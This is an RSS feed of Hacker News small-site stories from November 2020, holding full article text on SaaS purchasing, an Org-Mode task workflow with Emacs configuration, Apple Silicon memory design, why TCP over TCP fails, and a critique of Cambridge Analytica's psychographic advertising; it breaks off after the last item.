<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 15 Nov 2020 08:21:56 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 15 Nov 2020 08:21:56 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[SaaS Needs a Single Point of Purchase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081711">thread link</a>) | @alangibson
<br/>
November 13, 2020 | https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html | <a href="https://web.archive.org/web/*/https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href="/2020/11/13/saas-needs-a-single-point-of-purchase.html">
	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

<p><a href="https://news.ycombinator.com/item?id=25081711">Hacker News Discussion Thread</a></p>


</div></div>]]>
            </description>
            <link>https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081711</guid>
            <pubDate>Fri, 13 Nov 2020 13:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Org-Mode Workflow: Task Management]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081372">thread link</a>) | @mromanuk
<br/>
November 13, 2020 | https://whhone.com/posts/org-mode-task-management/ | <a href="https://web.archive.org/web/*/https://whhone.com/posts/org-mode-task-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
			
<main role="main">
	<article>
		<div>
			<p>As mentioned in the <a href="https://whhone.com/posts/from-evernote-to-org-mode/">last post</a>, I switched to Org-Mode.  I kept adjusting my workflow with this new tool and it has been stabilized for a month. I think it is time to talk about the new workflow for task/time management with Org-Mode. This blog post consists of four parts: the principles, the definitions, the workflows, and finally the implementations.</p>
<h2 id="1-the-principles">1 The Principles</h2>
<p>Principles remain valid no matter what the tool is.</p>
<h3 id="11-do-not-add-tasks-indiscriminately">1.1 Do Not Add Tasks Indiscriminately</h3>
<p>Not every task should go into the system. Avoid filling the system with bullshits and hiding the things that matter. I only add tasks that I really want or need to do.</p>
<p>To clarify<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, the task management system describled below is not the “inbox” in GTD. I still capture things into my inbox but not all of them will be converted to a task in the task management system (org agenda files) eventually.</p>
<h3 id="12-not-all-tasks-have-to-be-done">1.2 Not All Tasks Have To Be Done</h3>
<p>There are two reasons for this. First, tasks could be deprioritized or even become unnecessary. Second, we have limited time and cannot do everything. We should have an opinion on the priority.</p>
<h3 id="13-reduce-the-number-of-open-loop">1.3 Reduce The Number Of Open Loop</h3>
<p>Open loops are tasks that have been started but not finished. They stay in our minds and occupy some of our limited working memory so that we cannot focus on another task we are working on.</p>
<p>Also, open loops reduce agility, according to <a href="https://en.wikipedia.org/wiki/Little%27s_law">Little’s Law</a>. The more the open loops, the longer time finish each of them on average.</p>
<h3 id="14-reduce-decision-making-of-what-to-do-next">1.4 Reduce Decision Making Of What To Do Next</h3>
<p>The system should suggest to the user what to do next so that the user can reserve the will power to the real task. This also avoids skipping hard tasks with easy tasks unconsciously.</p>
<h2 id="2-the-definitions">2 The Definitions</h2>
<p>Each task in Org-Mode has a <a href="https://orgmode.org/manual/Workflow-states.html">TODO keyword</a>, optionally <a href="https://orgmode.org/manual/Deadlines-and-Scheduling.html">a scheduled date, and a deadline</a>. For example,</p>
<div><pre><code data-lang="org">*<span> PROG Write a blog post on task management with Org-Mode</span>
DEADLINE: &lt;<span>2020-11-07 Sat</span>&gt; SCHEDULED: &lt;<span>2020-10-31 Sat</span>&gt;
</code></pre></div><p>Each Org-Mode user could define their own set of TODO keywords and use scheduled dates and deadlines differently. For example, some people use only two TODO keywords, “TODO” and “DONE”, while some use more. Some people set “scheduled dates” to all the tasks while some people set it to some of the tasks. These nuances could result in a very different workflow, although they are using the same Org-Mode. Let’s take a look at how I use them.</p>
<h3 id="21-todo-keywords">2.1 TODO Keywords</h3>
<p>I use as few TODO keywords as possible but not too few. For example, it is common to use only two states (“TODO” and “DONE”) but this does not align with the principles I mentioned above. I need a state for “open loops” so that I can keep the number of them small. I also need to distinguish a smaller set of “next actions” from all tasks.</p>
<p>So far, I defined these five keywords:</p>
<table>
<thead>
<tr>
<th>TODO Keyword</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TODO</code></td>
<td><strong>Tasks that are not started and not planned.</strong> They could be the backlogs or the GTD’s someday/maybe. These tasks could be converted to <code>NEXT</code> during a review.</td>
</tr>
<tr>
<td><code>NEXT</code></td>
<td><strong>Tasks that are not started but planned to do as soon as I can.</strong>  When there is no actionable <code>PROG</code> (e.g., blocked), I start one of those and convert it to <code>PROG</code>.</td>
</tr>
<tr>
<td><code>PROG</code></td>
<td><strong>Tasks that are working in progress (open loops).</strong> I work on these tasks before starting another <code>NEXT</code> task to avoid too many open loops at any moment.</td>
</tr>
<tr>
<td><code>INTR</code></td>
<td><strong>The tasks that are interruptions.</strong> They are urgent things that I should drop everything else and work on it. For example, production issues.</td>
</tr>
<tr>
<td><code>DONE</code></td>
<td><strong>The tasks that are completed.</strong></td>
</tr>
</tbody>
</table>
<p>This diagram illustrates the transition of those states.</p>
<pre><code>                                 +------+
                                 | INTR |
                                 +------+
                                    |
                                    v
+------+   +------+   +------+   +------+
| TODO |--&gt;| NEXT |--&gt;| PROG |--&gt;| DONE |
+------+   +------+   +------+   +------+
</code></pre><h3 id="22-scheduled-and-deadline">2.2 Scheduled and Deadline</h3>
<p>In the past, I tended to set a date for all tasks. If I want to do A, B, and C on Monday, then I schedule them for Monday. This sounds very intuitive but, in reality, I ended up rescheduling many incompleted tasks at the end of every day. It was not only wasting time but also depressing.</p>
<p>Later, I changed to rely more on the TODO keywords. For example, if a task is still in progress, I keep the state unchanged as <code>PROG</code> instead of rescheduling it every day until it is done. I am now using the “scheduled date” to hide a task until the date I should look at it again. Similar to the snooze feature in Gmail.</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SCHEDULED</code></td>
<td>Hide the task until the scheduled date.</td>
</tr>
<tr>
<td><code>DEADLINE</code></td>
<td>The deadline of the task.</td>
</tr>
</tbody>
</table>
<p>For example, when a <code>PROG</code> task is being blocked, I set the <code>SCHEDULED</code> date to hide it until the date I want to revisit. On the scheduled date, if the task is unblocked, I will remove the <code>SCHEDULED</code> date. If the task is still blocked, I reschedule it again. It acts as the <a href="https://hamberg.no/gtd#the-waiting-for-list">waiting for list</a> in GTD.</p>
<h2 id="3-the-workflow">3 The Workflow</h2>
<p>I customize my org agenda view to drive my daily workflow. The customized agenda view has four sections. From the top to bottom, they are the tasks scheduled today, the <code>INTR</code> tasks, the <code>PROG</code> tasks, and finally the <code>NEXT</code> tasks.</p>
<p><img src="https://whhone.com/img/org-agenda.png" alt="Org Agenda"></p>
<p>My daily workflow goes from the top to the bottom.</p>
<h3 id="31-update-tasks-scheduled-today">3.1 Update Tasks Scheduled Today</h3>
<p>At the beginning of the day, I review the tasks that are scheduled for today. The goal here is not to finish them, but to update or remove the scheduled date so that there is nothing left.</p>
<ol>
<li>If the task is still blocked, reschedule it</li>
<li>If the task could be done in a few minutes, then do it and mark it as <code>DONE</code>.</li>
<li>Otherwise, remove the scheduled date and optionally update the TODO keywords.</li>
</ol>
<p>Removing the scheduled date is the best outcome. It indicates the previous estimation was correct, at least not too early. Rescheduling indicates the previous estimation is inaccurate. I would avoid rescheduling the task to tomorrow indiscriminately and try to make a good estimation to reduce the number of rescheduling.</p>
<h3 id="32-find-the-next-task-to-work-on">3.2 Find the Next Task to Work On</h3>
<p>After reviewing all tasks scheduled for today, it is time to pick a task and do some real works. This step is very straight-forward with the customized agenda view above.</p>
<ol>
<li>Pick an <code>INTR</code> task if there is any.</li>
<li>If there is no <code>INTR</code> task, then pick a <code>PROG</code> task and work on it. If that task is blocked, set a <code>SCHEDULED</code> date to hide it.</li>
<li>If there is no <code>INTR</code> and <code>PROG</code> task, then start a <code>NEXT</code> task.</li>
<li>If there is no task in the agenda view, then review the <code>TODO</code> tasks and convert some to <code>NEXT</code>.</li>
</ol>
<h3 id="33-review-the-system">3.3 Review the System</h3>
<p>The secret of having a system that works in the long-term is regular maintenance. I do it at least once a week. For examples,</p>
<ul>
<li>Promote some tasks from <code>TODO</code> to <code>NEXT</code>. Demote or even delete deprioritized tasks.</li>
<li>Review the <a href="https://whhone.com/posts/daily-journal/">journal</a> and add <code>TODO</code> if something needs follow-up.</li>
<li><a href="https://orgmode.org/manual/Archiving.html">Archive</a> completed tasks and extract to permanent notes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</li>
</ul>
<h2 id="4-the-configuration">4 The Configuration</h2>
<p>Finally, here is the configuration for the above workflow.</p>
<div><pre><code data-lang="lisp"><span>;; Emacs Easy Customization ("M-x customize") syntax is used.</span>
<span>;; If you prefer using .el files directly, set it with "setq".</span>

<span>;; TODO keywords.</span>
<span>'</span>(org-todo-keywords
  <span>'</span>((<span>sequence</span> <span>"TODO(t)"</span> <span>"NEXT(n)"</span> <span>"PROG(p)"</span> <span>"INTR(i)"</span> <span>"DONE(d)"</span>)))

<span>;; Show the daily agenda by default.</span>
<span>'</span>(org-agenda-span <span>'day</span>)

<span>;; Hide tasks that are scheduled in the future.</span>
<span>'</span>(org-agenda-todo-ignore-scheduled <span>'future</span>)

<span>;; Hide the deadline prewarning prior to scheduled date.</span>
<span>'</span>(org-agenda-skip-deadline-prewarning-if-scheduled <span>'pre-scheduled</span>)

<span>;; Customized view for the daily workflow. (Command: "C-c a n")</span>
<span>'</span>(org-agenda-custom-commands
  <span>'</span>((<span>"n"</span> <span>"Agenda / INTR / PROG / NEXT"</span>
     ((agenda <span>""</span> <span>nil</span>)
      (todo <span>"INTR"</span> <span>nil</span>)
      (todo <span>"PROG"</span> <span>nil</span>)
      (todo <span>"NEXT"</span> <span>nil</span>))
     <span>nil</span>)))
</code></pre></div><section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Thanks for <a href="https://www.reddit.com/r/orgmode/comments/jmf8dw/an_orgmode_workflow_for_task_management/gavkv1r/?context=3">this comment</a> in Reddit. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>There will be another post for Org-Mode note-taking workflow. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</div>
		
	</article>
</main>







			</div>
			
		</div>
		
	</div></div>]]>
            </description>
            <link>https://whhone.com/posts/org-mode-task-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081372</guid>
            <pubDate>Fri, 13 Nov 2020 12:01:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Silicon, Xeon Phi, and Amigas]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080913">thread link</a>) | @ingve
<br/>
November 13, 2020 | https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/ | <a href="https://web.archive.org/web/*/https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>The new <a href="https://www.macworld.co.uk/news/how-good-is-apples-m1-chip-really-3797893/">M1 chip in the new Macs</a> has 8-16GB of DRAM on the package, just like many mobile phones or single-board computers. But unlike many desktop, laptop or workstation computers (there are exceptions). In the first tranche of Macs using the chip, that’s all the addressable RAM they have (i.e. ignoring caches), just like many mobile phones or single-board computers. But what happens when they move the Apple Silicon chips up the scale, to computers like the iMac or Mac Pro?</p>
<p>It’s possible that these models would have a few GB of memory on-package <em>and</em> access to memory modules connected via a conventional controller, for example DDR4 RAM. They almost certainly would if you could deploy <em>multiple</em> M1 (or successor) packages on a single system. Such a Mac would be a non-uniform memory access architecture (NUMA), which (depending on how it’s configured) has implications for how software can be designed to best make use of the memory.</p>
<p>NUMA computing is of course not new. If you have a computer with a CPU and a discrete graphics processor, you have a NUMA computer: the GPU has access to RAM that the CPU doesn’t, and vice versa. Running GPU code involves copying data from CPU-memory to GPU-memory, doing GPU stuff, then copying the result from GPU-memory to CPU-memory.</p>
<p>A hypothetical NUMA-because-Apple-Silicon Mac would not be like that. The GPU shares access to the integrated RAM with the CPU, a little like an Amiga. The situation on Amiga was that there was “chip RAM” (which both the CPU and graphics and other peripheral chips could access), and “fast RAM” (only available to the CPU). The fast RAM was faster because the CPU didn’t have to wait for the coprocessors to use it, whereas they had to take turns accessing the chip RAM. Nonetheless, the CPU had access to all the RAM, and programmers had to tell `AllocMem` whether they wanted to use chip RAM, fast RAM, or didn’t care.</p>
<p>A NUMA Mac would not be like that, either. It would share the property that there’s a subset of the RAM available for sharing with the GPU, but this memory would be faster than the off-chip memory because of the closer integration and lack of (relatively) long communication bus. Apple has described the integrated RAM as “high bandwidth”, which probably means multiple access channels.</p>
<p>A better and more recently analogy to this setup is Intel’s discontinued supercomputer chip, <a href="https://www.anandtech.com/show/8217/intels-knights-landing-coprocessor-detailed">Knight’s Landing</a> (marketed as Xeon Phi). Like the M1, this chip has 16GB of on-die high bandwidth memory. Like my hypothetical Mac Pro, it can also access external memory modules. Unlike the M1, it has 64 or 72 identical cores rather than 4 big and 4 little cores.</p>
<p>There are three ways to configure a Xeon Phi computer. You can not use any external memory, and the CPU entirely uses its on-package RAM. You can use a cache mode, where the software only “sees” the external memory and the high-bandwidth RAM is used as a cache. Or you can go full NUMA, where programmers have to explicitly request memory in the high-bandwidth region to access it, like with the Amiga allocator.</p>
<p>People rarely go full NUMA. It’s hard to work out what split of allocations between the high-bandwidth and regular RAM yields best performance, so people tend to just run with cached mode and hope that’s faster than not having any on-package memory at all.</p>
<p>And that makes me think that a Mac would either not go full NUMA, or would not have public API for it. <em>Maybe</em> Apple would let the kernel and some OS processes have exclusive access to the on-package RAM, but even that seems overly complex (particularly where you have more than one M1 in a computer, so you need to specify core affinity for your memory allocations in addition to memory type). My guess is that an early workstation Mac with 16GB of M1 RAM and 64GB of DDR4 RAM would look like it has 64GB of RAM, with the on-package memory used for the GPU and as cache. NUMA APIs, if they come at all, would come later.</p>
	</div></div>]]>
            </description>
            <link>https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080913</guid>
            <pubDate>Fri, 13 Nov 2020 10:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why TCP over TCP is a bad idea (2001)]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25080693">thread link</a>) | @fanf2
<br/>
November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </p><hr>
    <address><a href="mailto:olaf@bigred.inka.de">Olaf Titz</a></address>
<!-- Created: Sun Oct 10 20:56:27 CEST 1999 -->
<!-- hhmts start -->
Last modified: Mon Apr 23 11:50:59 CEST 2001
<!-- hhmts end -->
  

</div>]]>
            </description>
            <link>http://sites.inka.de/~bigred/devel/tcp-tcp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080693</guid>
            <pubDate>Fri, 13 Nov 2020 09:43:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on the Cambridge Analytica Scandal]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25080591">thread link</a>) | @sobradob
<br/>
November 13, 2020 | http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/ | <a href="https://web.archive.org/web/*/http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <p><span>Nov 7, 2020 · 6 minute read
    
    <br>
    <a href="http://boazsobrado.com/categories/facebook">Facebook</a><a href="http://boazsobrado.com/categories/advertising">Advertising</a><a href="http://boazsobrado.com/categories/trump">Trump</a><a href="http://boazsobrado.com/categories/cambridge-analytica">Cambridge Analytica</a>
    </span></p><p>I am writing this to share my conclusions regarding the Cambridge Analytica affair. I have a somewhat unique perspective on the topic for three reasons:</p>

<ul>
<li>My day job consists of measuring the effectiveness of digital advertising.</li>
<li>I have first hand experience with the technology and methods that Cambridge Analytica claims to have used.</li>
<li>I played a small role in unearthing the Cambridge Analytica scandal.</li>
</ul>

<h2 id="what-cambridge-analytica-supposedly-did">What Cambridge Analytica supposedly did</h2>

<p>The New Statesmen’s Laurie Clarke puts it in the <a href="https://www.newstatesman.com/science-tech/social-media/2020/10/how-cambridge-analytica-scandal-unravelled">following way</a>:</p>

<blockquote>
<p>CA was alleged to have mined Facebook data from millions of people worldwide. The data was detailed enough for CA to create complex psychographic profiles of its subjects, to deliver pinpointed adverts to them and propel them into new behaviour patterns. The CA whistleblower Christopher Wylie described it as “Steve Bannon’s psychological warfare mind-fuck tool”. </p>
</blockquote>

<p>In the Netflix documentary <em>The Great Hack</em> Brittany Kaiser, the former business development executive of Cambridge Analytica says:</p>

<blockquote>
<p>“If we targeted enough persuadable people in the right precincts, then those states would turn red instead of blue… We bombarded them through blogs, websites, articles, videos on every platform you can imagine until they saw the world the way we wanted them to – until they voted for our candidate.”</p>
</blockquote>

<p>The implication here being that two of the greates political upsets of the last decade (Brexit &amp; Trump) were due to the advanced persuasion technology that Cambridge Analytica sold to the highest bidder.</p>

<p>My concern is that a lot of people seem to focus on a scary technology called psychographic advertising (also known as psychographic or&nbsp;<a href="https://hbr.org/2018/05/what-marketers-should-know-about-personality-based-marketing">personality marketing</a>) that purportedly allowed Cambridge Analytica to manipulate people by serving them ads tailored to their individual personality. My argument is that this technology is mostly ineffective in the context of modern digital advertising and is unlikely to have had the influence attributed to it. Moreover, it distracts from the true issues at stake, such as data privacy in the days of “<a href="https://www.theguardian.com/technology/2019/jan/20/shoshana-zuboff-age-of-surveillance-capitalism-google-facebook">surveillance capitalism</a>”.</p>

<h2 id="my-role-in-the-story">My role in the story</h2>

<p>Between 2012 and 2014 I did some work at the Cambridge University Psychometric Centre in as an undergraduate, and I met in person Alex Kogan and a lot of the people who were mentioned in the&nbsp;<a href="https://www.michalkosinski.com/clown-show">books</a>&nbsp;and&nbsp;<a href="https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html">articles</a>&nbsp;that have been written about the whole scandal. While at Cambridge I had access to key parts of the data set that inspired Cambridge Analytica’s work.</p>

<p>In 2015 I spent some time at Stanford, where I recruited several well-known brands (who I presume would rather not be named) to test psychographic marketing in a commercial setting. While doing my research on psychographic marketing, I discovered that a little known company called Cambridge Analytica was working with Ted Cruz on psychometric targeting in digital advertising.</p>

<p>I pointed this out to&nbsp;<a href="https://www.michalkosinski.com/">Dr Michal Kosinski</a>, who was familiar with the unethical way in which the Cambridge Analytica had collected its data. Michal then got in touch with a journalist at the Guardian, who produced the&nbsp;<a href="https://www.theguardian.com/us-news/2015/dec/11/senator-ted-cruz-president-campaign-facebook-user-data">first article</a>&nbsp;in what later became known as the Cambridge Analytica scandal in December 2015.</p>

<p>Eventually I failed to get psychographic advertising to work for commercial purposes in 2015 and moved on to other projects. Since then, I’ve also spoken to other teams that spent years trying to get a commercially viable personality marketing to work, who also failed. As far as I know, Facebook also ran some tests internally and decided not to proceed with it in early 2015. From this I drew the conclusion was that psychographic marketing doesn’t&nbsp;<strong>really</strong>&nbsp;work, particularly not in the way Cambridge Analytica claimed it did. Let me illustrate why by looking at one of the key scientific papers on personality marketing.</p>

<h2 id="what-the-science-says">What the science says</h2>

<p>This&nbsp;<a href="https://www.pnas.org/content/114/48/12714/">paper</a>&nbsp;was written by Sandra Matz and friends. The experiments they describe are clever: studies 1 and 2 show that you can target high individuals who score highly along a certain personality dimension (say, are extroverted), and that these individuals respond better to messages crafted for their end of the dimension than the opposite dimension (e.g. highly extroverted people respond better to high extroversion crafted messages than low extroversion messages). In study 3, they show that a psychologically targeted message towards introverts performed better than the copy used by a company previously.</p>

<p>This study is important in that it demonstrates three things:</p>

<ul>
<li>It is possible to target people online based on their personality</li>
<li>It is possible to tailor messages to people online based on their personality, and these messages perform better than those tailored for people with an opposite personality.</li>
</ul>

<p>What Sandra’s paper does not show, is that psychographic advertising performs better than standard methods used in digital advertising. In my experience it does not, and I can explain why.</p>

<p>Personality based advertising is based on a simple five dimensional model of human beings, designed to explain behaviours as diverse as reading books and going to clubs. Facebooks machine learning algorithms create a high dimensional model finely tuned with thousands of data points trying to optimise for very specific outcomes, such as purchasing a MAGA hat. The former is a general descriptive model built using statistical methods of the mid 20th century, with some but overall limited predictive general validity. The latter is a highly specialised machine learning model, with little descriptive power, but lot more accurate at predicting specific behaviours like the purchases of haircuts.</p>

<h2 id="digital-advertising-in-practice">Digital advertising in practice</h2>

<p>Keeping that in mind, which of these two digital approaches do you think will yield better results?</p>

<ul>
<li>Approach A: Summon the best psychologists and copywriters in the world to write copy that will get extroverted people to purchase a brand of deodorant. Target highly extroverted people on Facebook with that copy by advertising to people who have “liked” highly extroverted pages.</li>
<li>Approach B: Using Facebook’s machine learning algorithms generate a Lookalike audience based on previous purchasers on your site. Target these people with thousands of different types of programmatically generated messages, and focus on the better performing ones.</li>
</ul>

<p>When I researched this in 2015 I found that Approach B will perform better at all times. In fact, Approach B is more like what Trump&nbsp;<a href="https://www.theatlantic.com/technology/archive/2020/04/how-facebooks-ad-technology-helps-trump-win/606403/">actually did in 2016</a>:</p>

<p><em>“During the 2016 election cycle, Trump’s team ran 5.9 million ads on Facebook, spending $44 million from June to November alone. Hillary Clinton’s campaign ran only 66,000.”</em></p>

<p>Instead of trying a fancy secret sauce on how to design creatives and how to target them Trump’s team just threw everything at the algorithm and stuck with the ads that performed the best. All the psychological theory in the world has limited efficiency compared to the AI powering Facebook’s ad optimisations.</p>

<h2 id="so-what-do-i-think">So what do I think?</h2>

<p>In conclusion, it is not that psychographic advertising doesn’t work at all. The science behind it is solid, and it is worthy of study. My point is that psychographic advertising afforded Cambridge Analytica little to no advantage at all. Cambridge Analytica was working with more or less the same technology as their competitors. Most of the outlandish claims made by Cambridge Analytica were just branding, and subsequently sensationalism by reporting journalists. These are not just my conclusions by the way, they are also the findings of the&nbsp;<a href="https://ico.org.uk/media/action-weve-taken/2618383/20201002_ico-o-ed-l-rtl-0181_to-julian-knight-mp.pdf">British Information Commissioner’s Office</a>&nbsp;(excellent summary&nbsp;<a href="https://twitter.com/nickconfessore/status/1313853996168351747">here</a>). The “secret sauce” part of this affair should not distract from the wide scale data harvesting of large tech monopolies and the data privacy issues that arise from it.</p>

  </div>
  
</div></div>]]>
            </description>
